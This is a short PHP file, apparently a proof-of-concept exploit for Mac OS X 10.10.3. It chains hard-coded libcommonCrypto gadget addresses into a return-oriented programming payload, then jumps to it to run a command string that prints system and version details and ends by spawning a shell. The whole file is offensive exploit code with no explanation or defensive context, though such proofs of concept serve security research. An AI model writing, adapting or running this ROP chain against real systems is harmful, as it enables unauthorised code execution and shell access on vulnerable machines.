<?
// for Mac OS X 10.10.3, libcommonCrypto ROP

require("pm.php");
$all=alloc(128);
memcpy($all, "uname -a; php -v; sw_vers -productVersion; sw_vers -buildVersion; sh\0");
$rop=ibuf(0,8).ibuf(0,8).ibuf(0x7fff86e6a062,8).ibuf(0x7fff86e6d17C,8).ibuf(0x7fff86e6d288,8 /*stack alignment, ret gadget*/).ibuf(0x7fff86e6d286,8).ibuf($all['ptr'],8).ibuf(0,8).ibuf(0x7fff893c705d,8).ibuf(0x7fff893a6b99,8);
jump(0x7fff86e6764f, $rop);
?>
